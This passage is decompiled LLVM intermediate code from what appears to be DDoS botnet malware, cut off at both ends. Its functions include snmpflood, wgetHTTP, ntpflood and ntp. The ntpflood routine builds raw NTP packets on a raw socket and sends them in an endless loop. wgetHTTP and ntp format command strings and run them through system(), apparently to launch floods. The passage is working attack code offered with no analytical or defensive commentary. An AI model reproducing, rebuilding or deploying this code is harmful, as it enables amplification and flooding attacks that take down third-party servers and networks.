  store i32 %v3_bec4, i32* %r2.global-to-local, align 4
  store i32 %v2_bed0, i32* %r3.global-to-local, align 4
  %v3_bf54 = call i32 @snmpflood(i32 %v2_bed0, i32 %v3_be9c, i32 %v3_bec4)
  %v1_bf5c = add nuw nsw i32 %storemerge247, 1
  store i32 %v1_bf5c, i32* %r2.global-to-local, align 4
  store i32 %v1_bc50, i32* %r3.global-to-local, align 4
  %v5_bf70 = icmp slt i32 %v1_bf5c, %v1_bc50
  br i1 %v5_bf70, label %dec_label_pc_bebc, label %dec_label_pc_bf64.dec_label_pc_bf74_crit_edge

dec_label_pc_bf64.dec_label_pc_bf74_crit_edge:    ; preds = %dec_label_pc_bebc
  %v1_bf8c.pre = load i32, i32* @sp, align 4
  br label %dec_label_pc_bf74

dec_label_pc_bf74:                                ; preds = %dec_label_pc_bf64.dec_label_pc_bf74_crit_edge, %dec_label_pc_be28
  %v1_bf8c = phi i32 [ %v1_bf8c.pre, %dec_label_pc_bf64.dec_label_pc_bf74_crit_edge ], [ %v2_be88, %dec_label_pc_be28 ]
  store i32 %v1_be50, i32* %r3.global-to-local, align 4
  %v2_bf7c = load i32, i32* %v1_be54, align 4
  store i32 %v2_bf7c, i32* %ip.global-to-local, align 4
  %v1_bf84 = add i32 %arg4, 8
  store i32 %v1_bf84, i32* %r3.global-to-local, align 4
  %v1_bf88 = inttoptr i32 %v1_bf84 to i32*
  %v2_bf88 = load i32, i32* %v1_bf88, align 4
  %v2_bf8c = inttoptr i32 %v1_bf8c to i32*
  store i32 %v2_bf88, i32* %v2_bf8c, align 4
  store i32 ptrtoint ([37 x i8]* @global_var_372b4.192 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v0_bf9c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_bf9c, i32* %r3.global-to-local, align 4
  %v3_bfa0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_372b4.192 to i32))
  %v1_c0a4 = add i32 %arg4, 24
  %v1_c0a8 = inttoptr i32 %v1_c0a4 to i32*
  br label %dec_label_pc_c0a0

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_c0a0
  store i32 50, i32* %r1.global-to-local, align 4
  store i32 200, i32* %r2.global-to-local, align 4
  store i32 50000, i32* %r3.global-to-local, align 4
  %v1_bfe0 = call i32 @usleep(i32 50000)
  %v2_bfe8 = load i32, i32* @global_var_526bc.176, align 4
  %v2_bff0 = mul i32 %v2_bfe8, 20
  store i32 %v2_bff0, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v2_bff0, %v1_bc6c
  %v2_c044 = load i32, i32* @global_var_52590.178, align 4
  store i32 %v2_c044, i32* %r3.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_c000, label %dec_label_pc_c040

dec_label_pc_c000:                                ; preds = %dec_label_pc_bfb0
  %v5_c00c = icmp sgt i32 %v2_c044, 0
  br i1 %v5_c00c, label %dec_label_pc_c028, label %dec_label_pc_c010

dec_label_pc_c010:                                ; preds = %dec_label_pc_c000
  %v2_c014 = load i32, i32* @global_var_4535c.180, align 4
  %v1_c018 = add i32 %v2_c014, 100
  store i32 %v1_c018, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_c018, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_c088

dec_label_pc_c028:                                ; preds = %dec_label_pc_c000
  %v1_c030 = add i32 %v2_c044, -1
  store i32 %v1_c030, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_52590.178 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_c030, i32* @global_var_52590.178, align 4
  br label %dec_label_pc_c088

dec_label_pc_c040:                                ; preds = %dec_label_pc_bfb0
  %v1_c048 = add i32 %v2_c044, 1
  store i32 %v1_c048, i32* %r2.global-to-local, align 4
  store i32 %v1_c048, i32* @global_var_52590.178, align 4
  %v2_c058 = load i32, i32* @global_var_4535c.180, align 4
  store i32 %v2_c058, i32* %r3.global-to-local, align 4
  %v1_c05c = add i32 %v2_c058, -25
  %tmp49 = icmp ult i32 %v2_c058, 26
  br i1 %tmp49, label %dec_label_pc_c07c, label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c040
  store i32 %v1_c05c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_c05c, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_c088

dec_label_pc_c07c:                                ; preds = %dec_label_pc_c040
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_c088

dec_label_pc_c088:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c028, %dec_label_pc_c010, %dec_label_pc_c07c
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v1_c098 = add i32 %storemerge3, 1
  br label %dec_label_pc_c0a0

dec_label_pc_c0a0:                                ; preds = %dec_label_pc_bf74, %dec_label_pc_c088
  %storemerge3 = phi i32 [ 0, %dec_label_pc_bf74 ], [ %v1_c098, %dec_label_pc_c088 ]
  store i32 %v1_c0a4, i32* %r3.global-to-local, align 4
  %v2_c0a8 = load i32, i32* %v1_c0a8, align 4
  store i32 %v2_c0a8, i32* %r3.global-to-local, align 4
  store i32 %v2_c0a8, i32* @r0, align 4
  %v1_c0b0 = call i32 @atol(i32 %v2_c0a8)
  %v2_c0bc = mul i32 %v1_c0b0, 20
  store i32 %v2_c0bc, i32* %r2.global-to-local, align 4
  store i32 %storemerge3, i32* %r3.global-to-local, align 4
  %v8_c0c8 = icmp sgt i32 %v2_c0bc, %storemerge3
  br i1 %v8_c0c8, label %dec_label_pc_bfb0, label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c0a0, %entry, %dec_label_pc_bb24
  %v1_c0d8 = phi i32 [ %v1_bac4, %entry ], [ %v3_bb34, %dec_label_pc_bb24 ], [ %v1_c0b0, %dec_label_pc_c0a0 ]
  ret i32 %v1_c0d8

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 1, 0 }
  uselistorder i32 %v1_c05c, { 1, 0 }
  uselistorder i32 %v2_c044, { 2, 0, 1, 3 }
  uselistorder i32 %v1_c0a4, { 1, 0 }
  uselistorder i32 %v1_bf5c, { 2, 1, 0 }
  uselistorder i32 %v2_bef8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_bed0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_becc, { 1, 0 }
  uselistorder i32 %storemerge247, { 3, 2, 1, 0 }
  uselistorder i32 %v3_be9c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_bd84, { 1, 0, 2, 3 }
  uselistorder i32 %v2_bd70, { 1, 0 }
  uselistorder i32 %v1_bd2c, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v1_bcb4, { 1, 2, 0 }
  uselistorder i32 %v3_bca0, { 1, 0, 2 }
  uselistorder i32 %v1_bc50, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_bc34, { 9, 2, 1, 4, 3, 5, 0, 6, 8, 7 }
  uselistorder i32 %v2_bba8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_bb70, { 1, 0, 2 }
  uselistorder i32 %v1_bb48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %v1_bb2c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_bb28, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 9, 10, 11, 1, 2, 3, 4, 6, 7, 5, 8, 12, 13, 14, 17, 15, 16, 59, 18, 19, 20, 36, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 0 }
  uselistorder i32* %r2.global-to-local, { 9, 1, 2, 3, 4, 5, 6, 7, 8, 12, 10, 11, 25, 13, 19, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c0a0, { 1, 0 }
  uselistorder label %dec_label_pc_c088, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_bebc, { 1, 0 }
  uselistorder label %dec_label_pc_be00, { 1, 0 }
  uselistorder label %dec_label_pc_bb24, { 1, 0 }
  uselistorder label %dec_label_pc_bb00, { 1, 0 }
}

define i32 @wgetHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1064 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 49420, i32* %stack_var_-4, align 4
  %v2_c108 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c108, i32* @fp, align 4
  %v1_c128 = call i32 @mfork(i32 %arg2)
  %v2_c130 = icmp eq i32 %v1_c128, 0
  br i1 %v2_c130, label %dec_label_pc_c138, label %dec_label_pc_c2f8

dec_label_pc_c138:                                ; preds = %entry
  %v8_c140 = icmp sgt i32 %arg3, 1
  br i1 %v8_c140, label %dec_label_pc_c15c, label %dec_label_pc_c144

dec_label_pc_c144:                                ; preds = %dec_label_pc_c138
  store i32 %arg2, i32* @r2, align 4
  %v3_c150 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_372dc.195 to i32))
  %v1_c158 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_c15c

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c138, %dec_label_pc_c144
  %v1_c160 = add i32 %arg4, 4
  %v1_c164 = inttoptr i32 %v1_c160 to i32*
  %v2_c164 = load i32, i32* %v1_c164, align 4
  %v1_c170 = add i32 %arg4, 8
  %v1_c174 = inttoptr i32 %v1_c170 to i32*
  %v2_c174 = load i32, i32* %v1_c174, align 4
  store i32 %v2_c174, i32* @r0, align 4
  %v1_c17c = call i32 @atol(i32 %v2_c174)
  %v2_c18c = call i32 @__GI_time(i32* null)
  %v2_c198 = add i32 %v2_c18c, %v1_c17c
  %v0_c1a0 = call i32 @rand()
  store i32 %arg2, i32* @r2, align 4
  %v3_c1fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_37300.321 to i32))
  %v1_c25c = inttoptr i32 %v2_c164 to i8*
  %v2_c278 = ptrtoint i32* %stack_var_-1064 to i32
  br label %dec_label_pc_c2d8

dec_label_pc_c204:                                ; preds = %dec_label_pc_c2d8
  %v0_c204 = call i32 @rand()
  %v2_c21c = srem i32 %v0_c204, 36
  %v4_c244 = mul nsw i32 %v2_c21c, 4
  %v5_c244 = add i32 %v4_c244, ptrtoint ([377 x i8*]* @global_var_44cb8.319 to i32)
  %v6_c244 = inttoptr i32 %v5_c244 to i32*
  %v7_c244 = load i32, i32* %v6_c244, align 4
  %v4_c24c = inttoptr i32 %v7_c244 to i8*
  %v3_c250 = call i32 @strlen(i8* %v4_c24c)
  store i32 %v3_c250, i32* @r4, align 4
  %v3_c260 = call i32 @strlen(i8* %v1_c25c)
  %v0_c268 = load i32, i32* @r4, align 4
  %v2_c268 = add i32 %v0_c268, %v3_c260
  %v3_c26c = mul i32 %v2_c268, 4
  %v1_c270 = add i32 %v3_c26c, 164
  store i32 %v2_c278, i32* @r0, align 4
  store i32 %v1_c270, i32* @r1, align 4
  %v8_c2c4 = call i32 @__GI_snprintf(i32 %v2_c278, i32 %v1_c270, i32 ptrtoint ([181 x i8]* @global_var_37320.324 to i32), i32 %v7_c244, i32 %v2_c164, i32 %v7_c244, i32 %v2_c164)
  %v1_c2d4 = call i32 @system(i32 %v2_c278)
  br label %dec_label_pc_c2d8

dec_label_pc_c2d8:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_c204
  %v2_c2dc = call i32 @__GI_time(i32* null)
  %v5_c2ec = icmp slt i32 %v2_c2dc, %v2_c198
  br i1 %v5_c2ec, label %dec_label_pc_c204, label %dec_label_pc_c2f0

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_c2d8
  %v1_c2f4 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_c2f8

dec_label_pc_c2f8:                                ; preds = %entry, %dec_label_pc_c2f0
  %v1_c300 = phi i32 [ %v1_c128, %entry ], [ %v1_c2f4, %dec_label_pc_c2f0 ]
  ret i32 %v1_c300

; uselistorder directives
  uselistorder i32 %v1_c270, { 1, 0 }
  uselistorder i32 %v2_c278, { 1, 0, 2 }
  uselistorder i32 %v2_c164, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c2f8, { 1, 0 }
  uselistorder label %dec_label_pc_c2d8, { 1, 0 }
  uselistorder label %dec_label_pc_c15c, { 1, 0 }
}

define i32 @setup_ntp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_c31c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c31c, i32* @ip, align 4
  %v1_c338 = call i32 @__GI_htons(i32 5678)
  %sext = mul i32 %v1_c338, 65536
  %v1_c33c = sdiv i32 %sext, 65536
  %v1_c348 = trunc i32 %v1_c33c to i16
  store i16 %v1_c348, i16* %arg1, align 2
  %v1_c350 = call i32 @__GI_htons(i32 123)
  %v1_c360 = trunc i32 %v1_c350 to i16
  %v3_c360 = add i32 %tmp, 2
  %v4_c360 = inttoptr i32 %v3_c360 to i16*
  store i16 %v1_c360, i16* %v4_c360, align 2
  %v3_c36c = add i32 %tmp, 6
  %v4_c36c = inttoptr i32 %v3_c36c to i16*
  store i16 0, i16* %v4_c36c, align 2
  %v1_c374 = add i32 %tmp, 8
  store i32 %v1_c374, i32* @r3, align 4
  store i32 %v1_c374, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_373d8.326 to i32), i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_c384 = call i32 @memcpy()
  %v1_c38c = call i32 @__GI_htons(i32 16)
  %v2_c38c = trunc i32 %v1_c38c to i16
  %v3_c39c = add i32 %tmp, 4
  %v4_c39c = inttoptr i32 %v3_c39c to i16*
  store i16 %v2_c38c, i16* %v4_c39c, align 2
  ret i32 %v1_c38c
}

define i32 @ntpflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4156 = alloca i32, align 4
  %stack_var_-4136 = alloca i32, align 4
  %v2_c3f0 = ptrtoint i32* %stack_var_-4136 to i32
  %v1_c3fc = add i32 %v2_c3f0, 20
  %v5_c400 = inttoptr i32 %v1_c3fc to i16*
  %v3_c41c = add i32 %arg1, 12
  %v4_c41c = inttoptr i32 %v3_c41c to i32*
  %v5_c41c = load i32, i32* %v4_c41c, align 4
  %v1_c428 = add i32 %arg1, 4
  %v2_c428 = inttoptr i32 %v1_c428 to i32*
  %v3_c428 = load i32, i32* %v2_c428, align 4
  %v3_c43c = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_c44c = icmp slt i32 %v3_c43c, 0
  br i1 %v1_c44c, label %dec_label_pc_c454, label %dec_label_pc_c45c

dec_label_pc_c454:                                ; preds = %entry
  %v1_c458 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_c45c

dec_label_pc_c45c:                                ; preds = %entry, %dec_label_pc_c454
  %v2_c460 = call i32 @__GI_time(i32* null)
  %v1_c46c = call i32 @init_rand(i32 %v2_c460)
  store i32 %v2_c3f0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_c488 = call i32 @__GI_memset()
  %v1_c490 = bitcast i32* %stack_var_-4136 to i8*
  %v2_c490 = call i32 @setup_ip_header(i8* %v1_c490)
  %v2_c498 = call i32 @setup_ntp_header(i16* %v5_c400)
  %v0_c49c = call i32 @rand()
  %v2_c4b8 = sdiv i32 %v0_c49c, 13065
  %tmp33 = mul i32 %v2_c4b8, -64509
  %v2_c4f4 = add i32 %tmp33, %v0_c49c
  %fold = add i32 %v2_c4f4, 1026
  %v3_c51c = urem i32 %fold, 65536
  %v1_c524 = call i32 @__GI_htons(i32 %v3_c51c)
  %v1_c534 = trunc i32 %v1_c524 to i16
  store i16 %v1_c534, i16* %v5_c400, align 4
  %v2_c558 = add i32 %v2_c3f0, 12
  %v3_c558 = inttoptr i32 %v2_c558 to i32*
  store i32 %v5_c41c, i32* %v3_c558, align 4
  %v1_c560 = add i32 %v3_c428, 4
  %v2_c560 = inttoptr i32 %v1_c560 to i32*
  %v3_c560 = load i32, i32* %v2_c560, align 4
  %v2_c568 = add i32 %v2_c3f0, 16
  %v3_c568 = inttoptr i32 %v2_c568 to i32*
  store i32 %v3_c560, i32* %v3_c568, align 4
  %v1_c57c = or i32 %v2_c3f0, 2
  %v2_c57c = inttoptr i32 %v1_c57c to i16*
  %v3_c57c = load i16, i16* %v2_c57c, align 2
  %div = udiv i16 %v3_c57c, 2
  %v3_c580 = zext i16 %div to i32
  %v2_c594 = bitcast i32* %stack_var_-4136 to i16*
  %v3_c594 = call i32 @csum(i16* %v2_c594, i32 %v3_c580)
  %v1_c5a4 = trunc i32 %v3_c594 to i16
  %v3_c5a4 = add i32 %v2_c3f0, 10
  %v4_c5a4 = inttoptr i32 %v3_c5a4 to i16*
  store i16 %v1_c5a4, i16* %v4_c5a4, align 2
  store i32 1, i32* %stack_var_-4156, align 4
  %v2_c5c4 = ptrtoint i32* %stack_var_-4156 to i32
  %v5_c5e4 = call i32 @__GI_setsockopt(i32 %v3_c43c, i32 0, i32 3, i32 %v2_c5c4, i32 4)
  %v1_c5ec = icmp slt i32 %v5_c5e4, 0
  br i1 %v1_c5ec, label %dec_label_pc_c5f4, label %dec_label_pc_c5fc

dec_label_pc_c5f4:                                ; preds = %dec_label_pc_c45c
  %v1_c5f8 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_c5fc

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c45c, %dec_label_pc_c5f4
  %v2_c600 = call i32 @__GI_time(i32* null)
  %v1_c60c = call i32 @init_rand(i32 %v2_c600)
  %v3_c694 = add i32 %v2_c3f0, 4
  %v4_c694 = inttoptr i32 %v3_c694 to i16*
  br label %dec_label_pc_c61c

dec_label_pc_c61c:                                ; preds = %dec_label_pc_c71c, %dec_label_pc_c5fc
  %stack_var_-28.0 = phi i32 [ %v3_c428, %dec_label_pc_c5fc ], [ %v3_c65c, %dec_label_pc_c71c ]
  %storemerge5 = phi i32 [ 0, %dec_label_pc_c5fc ], [ %v1_c724, %dec_label_pc_c71c ]
  %v3_c620 = load i16, i16* %v2_c57c, align 2
  %v4_c620 = zext i16 %v3_c620 to i32
  %v6_c654 = call i32 @sendto(i32 %v3_c43c, i32 %v2_c3f0, i32 %v4_c620, i32 0, i32 %stack_var_-28.0, i32 16)
  %v1_c65c = add i32 %stack_var_-28.0, 532
  %v2_c65c = inttoptr i32 %v1_c65c to i32*
  %v3_c65c = load i32, i32* %v2_c65c, align 4
  %v1_c668 = add i32 %v3_c65c, 4
  %v2_c668 = inttoptr i32 %v1_c668 to i32*
  %v3_c668 = load i32, i32* %v2_c668, align 4
  store i32 %v3_c668, i32* %v3_c568, align 4
  %v0_c674 = call i32 @rand_cmwc()
  %v1_c680 = call i32 @__GI_htonl(i32 %v0_c674)
  %v1_c694 = trunc i32 %v1_c680 to i16
  store i16 %v1_c694, i16* %v4_c694, align 4
  %v3_c6a8 = load i16, i16* %v2_c57c, align 2
  %div34 = udiv i16 %v3_c6a8, 2
  %v3_c6ac = zext i16 %div34 to i32
  %v3_c6c0 = call i32 @csum(i16* %v2_c594, i32 %v3_c6ac)
  %v1_c6d0 = trunc i32 %v3_c6c0 to i16
  store i16 %v1_c6d0, i16* %v4_c5a4, align 2
  %v2_c6d8 = load i32, i32* @global_var_526bc.176, align 4
  %v1_c6dc = add i32 %v2_c6d8, 1
  store i32 %v1_c6dc, i32* @global_var_526bc.176, align 4
  %v2_c6ec = load i32, i32* @global_var_52590.178, align 4
  %tmp = icmp ugt i32 %v2_c6ec, %storemerge5
  br i1 %tmp, label %dec_label_pc_c71c, label %dec_label_pc_c700

dec_label_pc_c700:                                ; preds = %dec_label_pc_c61c
  %v2_c710 = load i32, i32* @global_var_4535c.180, align 4
  %v1_c718 = call i32 @usleep(i32 %v2_c710)
  br label %dec_label_pc_c71c

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c61c, %dec_label_pc_c700
  %stack_var_-4168.0 = phi i32 [ %storemerge5, %dec_label_pc_c61c ], [ 0, %dec_label_pc_c700 ]
  %v1_c724 = add i32 %stack_var_-4168.0, 1
  br label %dec_label_pc_c61c

; uselistorder directives
  uselistorder i32 %v3_c65c, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_c49c, { 1, 0 }
  uselistorder i32 %v2_c3f0, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4156, { 1, 0 }
  uselistorder label %dec_label_pc_c71c, { 1, 0 }
  uselistorder label %dec_label_pc_c5fc, { 1, 0 }
  uselistorder label %dec_label_pc_c45c, { 1, 0 }
}

define i32 @ntp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1152 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_c744 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c744, i32* %ip.global-to-local, align 4
  store i32 51024, i32* %stack_var_-4, align 4
  %v2_c74c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c74c, i32* @fp, align 4
  %v2_c754 = ptrtoint i32* %stack_var_-1152 to i32
  store i32 %v2_c754, i32* %r3.global-to-local, align 4
  %v1_c774 = call i32 @mfork(i32 %arg2)
  store i32 %v1_c774, i32* %r3.global-to-local, align 4
  %v2_c77c = icmp eq i32 %v1_c774, 0
  br i1 %v2_c77c, label %dec_label_pc_c784, label %dec_label_pc_cd84

dec_label_pc_c784:                                ; preds = %entry
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_c790 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_c790, i32* %r3.global-to-local, align 4
  %v1_c7a0 = icmp slt i32 %v3_c790, 0
  br i1 %v1_c7a0, label %dec_label_pc_c7a8, label %dec_label_pc_c7b0

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c784
  %v1_c7ac = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_c7b0

dec_label_pc_c7b0:                                ; preds = %dec_label_pc_c784, %dec_label_pc_c7a8
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_c7b8 = icmp sgt i32 %arg3, 5
  br i1 %v8_c7b8, label %dec_label_pc_c7d4, label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7b0
  store i32 ptrtoint ([112 x i8]* @global_var_373e4.332 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_c7c8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([112 x i8]* @global_var_373e4.332 to i32))
  %v1_c7d0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7b0, %dec_label_pc_c7bc
  %v1_c7d8 = add i32 %arg4, 12
  store i32 %v1_c7d8, i32* %r3.global-to-local, align 4
  %v1_c7dc = inttoptr i32 %v1_c7d8 to i32*
  %v2_c7dc = load i32, i32* %v1_c7dc, align 4
  store i32 %v2_c7dc, i32* %r3.global-to-local, align 4
  %v1_c7e0 = inttoptr i32 %v2_c7dc to i8*
  %v3_c7e4 = call i32 @strlen(i8* %v1_c7e0)
  %v2_c7f4 = mul i32 %v3_c7e4, 5
  %v1_c7f8 = add i32 %v2_c7f4, 160
  store i32 %v1_c7f8, i32* %r2.global-to-local, align 4
  store i32 1023, i32* %r3.global-to-local, align 4
  %v8_c810 = icmp sgt i32 %v1_c7f8, 1023
  br i1 %v8_c810, label %dec_label_pc_cd84, label %dec_label_pc_c814

dec_label_pc_c814:                                ; preds = %dec_label_pc_c7d4
  store i32 %v1_c7f8, i32* %ip.global-to-local, align 4
  store i32 %v1_c7d8, i32* %r3.global-to-local, align 4
  %v2_c820 = load i32, i32* %v1_c7dc, align 4
  store i32 %v2_c820, i32* @lr, align 4
  store i32 %v1_c7d8, i32* %r3.global-to-local, align 4
  %v2_c82c = load i32, i32* %v1_c7dc, align 4
  store i32 %v2_c82c, i32* @r4, align 4
  store i32 %v1_c7d8, i32* %r3.global-to-local, align 4
  %v2_c838 = load i32, i32* %v1_c7dc, align 4
  store i32 %v2_c838, i32* %r1.global-to-local, align 4
  store i32 %v1_c7d8, i32* %r3.global-to-local, align 4
  %v2_c844 = load i32, i32* %v1_c7dc, align 4
  %v2_c858 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_c82c, i32* %stack_var_-1152, align 4
  store i32 %v2_c858, i32* @r0, align 4
  store i32 %v1_c7f8, i32* @r1, align 4
  store i32 ptrtoint ([171 x i8]* @global_var_37454.334 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_c820, i32* %r3.global-to-local, align 4
  %v8_c87c = call i32 @__GI_snprintf(i32 %v2_c858, i32 %v1_c7f8, i32 ptrtoint ([171 x i8]* @global_var_37454.334 to i32), i32 %v2_c820, i32 %v2_c82c, i32 %v2_c838, i32 %v2_c844)
  store i32 %v2_c858, i32* %r3.global-to-local, align 4
  %v1_c88c = call i32 @system(i32 %v2_c858)
  %v2_c894 = call i32 @__GI_time(i32* null)
  store i32 %v2_c894, i32* %r3.global-to-local, align 4
  %v1_c8a0 = call i32 @srand(i32 %v2_c894)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_536c4.157, align 4
  store i32 128, i32* %r3.global-to-local, align 4
  %v1_c8c8 = call i32 @malloc(i32 128)
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v1_c8c8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_c8e4 = call i32 @__GI_memset()
  %v1_c8f4 = add i32 %arg4, 16
  store i32 %v1_c8f4, i32* %r3.global-to-local, align 4
  %v1_c8f8 = inttoptr i32 %v1_c8f4 to i32*
  %v2_c8f8 = load i32, i32* %v1_c8f8, align 4
  store i32 %v2_c8f8, i32* %r3.global-to-local, align 4
  store i32 %v2_c8f8, i32* @r0, align 4
  %v1_c900 = call i32 @atol(i32 %v2_c8f8)
  %v1_c910 = add i32 %arg4, 20
  store i32 %v1_c910, i32* %r3.global-to-local, align 4
  %v1_c914 = inttoptr i32 %v1_c910 to i32*
  %v2_c914 = load i32, i32* %v1_c914, align 4
  store i32 %v2_c914, i32* %r3.global-to-local, align 4
  store i32 %v2_c914, i32* @r0, align 4
  %v1_c91c = call i32 @atol(i32 %v2_c914)
  store i32 0, i32* @global_var_52590.178, align 4
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_37500.339 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* @r1, align 4
  %v3_c950 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_37500.339 to i32), i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32))
  store i32 %v3_c950, i32* %r3.global-to-local, align 4
  %v1_c964 = add i32 %v0_c8e4, -1
  %v4_c968 = inttoptr i32 %v0_c8e4 to i8*
  br label %dec_label_pc_cabc.outer

dec_label_pc_c960:                                ; preds = %dec_label_pc_cabc
  store i32 %v0_c8e4, i32* %r3.global-to-local, align 4
  %v3_c96c = call i32 @strlen(i8* %v4_c968)
  %v2_c974 = add i32 %v1_c964, %v3_c96c
  store i32 %v2_c974, i32* %r3.global-to-local, align 4
  %v1_c978 = inttoptr i32 %v2_c974 to i8*
  %v2_c978 = load i8, i8* %v1_c978, align 1
  %v3_c978 = zext i8 %v2_c978 to i32
  store i32 %v3_c978, i32* %r3.global-to-local, align 4
